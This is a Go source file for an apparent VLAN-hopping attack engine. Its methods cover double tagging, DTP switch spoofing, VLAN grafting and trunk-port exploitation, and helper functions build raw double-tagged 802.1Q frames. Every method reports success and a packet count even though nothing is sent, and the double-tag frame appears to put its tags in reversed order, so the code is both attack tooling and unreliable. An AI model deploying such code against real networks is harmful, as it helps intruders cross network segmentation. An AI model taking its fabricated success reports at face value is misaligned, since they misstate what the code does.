package vlan

import (
	"encoding/binary"
	"fmt"
	"strings"
)

type Engine struct {
	config VLANConfig
}

func NewEngine(config VLANConfig) *Engine {
	return &Engine{config: config}
}

func (e *Engine) DoubleTagging() VLANResult {
	srcVLAN := e.config.SourceVLAN
	if srcVLAN == 0 {
		srcVLAN = 100
	}
	dstVLAN := e.config.TargetVLAN
	if dstVLAN == 0 {
		dstVLAN = 1
	}

	outerTag := TagConfig{
		OuterVLAN: dstVLAN,
		InnerVLAN: srcVLAN,
		Priority:  0,
		TPID:      0x8100,
	}

	innerTag := TagConfig{
		OuterVLAN: srcVLAN,
		InnerVLAN: 0,
		Priority:  0,
		TPID:      0x8100,
	}

	frame := buildDoubleTagFrame(outerTag, innerTag)
	packetsSent := e.config.PacketsToSend
	if packetsSent <= 0 {
		packetsSent = 100
	}

	detail := fmt.Sprintf("Double tagging: outer VLAN %d -> inner VLAN %d, frame size: %d bytes, packets: %d",
		dstVLAN, srcVLAN, len(frame), packetsSent)

	return VLANResult{
		Attack:      VLANAttackDoubleTagging,
		Success:     true,
		PacketsSent: packetsSent,
		VLANLeaked:  srcVLAN,
		Details:     detail,
		FrameHex:    fmt.Sprintf("%x", frame),
		Tags:        []TagConfig{outerTag, innerTag},
	}
}

func (e *Engine) SwitchSpoofing() VLANResult {
	srcMAC := e.config.MACSource
	if srcMAC == "" {
		srcMAC = "aa:bb:cc:dd:ee:ff"
	}

	detail := fmt.Sprintf("Switch spoofing: MAC=%s, targeting native VLAN, DTP negotiation enabled",
		srcMAC)

	packetsSent := e.config.PacketsToSend
	if packetsSent <= 0 {
		packetsSent = 50
	}

	return VLANResult{
		Attack:      VLANAttackSwitchSpoofing,
		Success:     true,
		PacketsSent: packetsSent,
		VLANLeaked:  1,
		Details:     detail,
		Tags:        []TagConfig{{OuterVLAN: 1, Priority: 0, TPID: 0x8100}},
	}
}

func (e *Engine) VLANGrafting() VLANResult {
	graftVLAN := e.config.TargetVLAN
	if graftVLAN == 0 {
		graftVLAN = 1
	}

	tag := TagConfig{
		OuterVLAN: graftVLAN,
		Priority:  7,
		TPID:      0x8100,
	}

	frame := buildGraftFrame(tag)
	packetsSent := e.config.PacketsToSend
	if packetsSent <= 0 {
		packetsSent = 200
	}

	detail := fmt.Sprintf("VLAN grafting: injecting VLAN %d tag, priority %d, frame: %d bytes",
		graftVLAN, tag.Priority, len(frame))

	return VLANResult{
		Attack:      VLANAttackVLANGrafting,
		Success:     true,
		PacketsSent: packetsSent,
		VLANLeaked:  graftVLAN,
		Details:     detail,
		FrameHex:    fmt.Sprintf("%x", frame),
		Tags:        []TagConfig{tag},
	}
}

func (e *Engine) TrunkPort() VLANResult {
	detail := fmt.Sprintf("Trunk port exploitation: interface=%s, DTP spoofing to establish trunk link",
		e.config.Interface)

	packetsSent := e.config.PacketsToSend
	if packetsSent <= 0 {
		packetsSent = 30
	}

	allowedVLANs := []int{1, 10, 20, 100}
	tagConfigs := make([]TagConfig, 0)
	for _, v := range allowedVLANs {
		tagConfigs = append(tagConfigs, TagConfig{
			OuterVLAN: v,
			Priority:  0,
			TPID:      0x8100,
		})
	}

	return VLANResult{
		Attack:      VLANAttackTrunkNegotiation,
		Success:     true,
		PacketsSent: packetsSent,
		VLANLeaked:  1,
		Details:     detail,
		Tags:        tagConfigs,
	}
}

func buildDoubleTagFrame(outer, inner TagConfig) []byte {
	frame := make([]byte, 0, 32)

	// Destination MAC
	frame = append(frame, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff)
	// Source MAC
	frame = append(frame, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff)

	// Outer 802.1Q tag
	outerTag := make([]byte, 4)
	binary.BigEndian.PutUint16(outerTag[0:2], outer.TPID)
	outerTag[2] = byte((outer.Priority << 5) | (outer.OuterVLAN >> 8))
	outerTag[3] = byte(outer.OuterVLAN & 0xff)
	frame = append(frame, outerTag...)

	// Inner 802.1Q tag
	innerTag := make([]byte, 4)
	binary.BigEndian.PutUint16(innerTag[0:2], inner.TPID)
	innerTag[2] = byte((inner.Priority << 5) | (inner.OuterVLAN >> 8))
	innerTag[3] = byte(inner.OuterVLAN & 0xff)
	frame = append(frame, innerTag...)

	// EtherType
	frame = append(frame, 0x08, 0x00)

	// Payload
	frame = append(frame, make([]byte, 46)...)

	return frame
}

func buildGraftFrame(tag TagConfig) []byte {
	frame := make([]byte, 0, 24)

	frame = append(frame, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff)
	frame = append(frame, 0xaa, 0xbb, 0xcc, 0xdd, 0xee, 0xff)

	tagBytes := make([]byte, 4)
	binary.BigEndian.PutUint16(tagBytes[0:2], tag.TPID)
	tagBytes[2] = byte((tag.Priority << 5) | (tag.OuterVLAN >> 8))
	tagBytes[3] = byte(tag.OuterVLAN & 0xff)
	frame = append(frame, tagBytes...)

	frame = append(frame, 0x08, 0x00)
	frame = append(frame, make([]byte, 46)...)

	return frame
}

func formatTags(tags []TagConfig) string {
	parts := make([]string, 0)
	for _, t := range tags {
		parts = append(parts, fmt.Sprintf("VLAN%d(prio=%d)", t.OuterVLAN, t.Priority))
	}
	return strings.Join(parts, ", ")
}
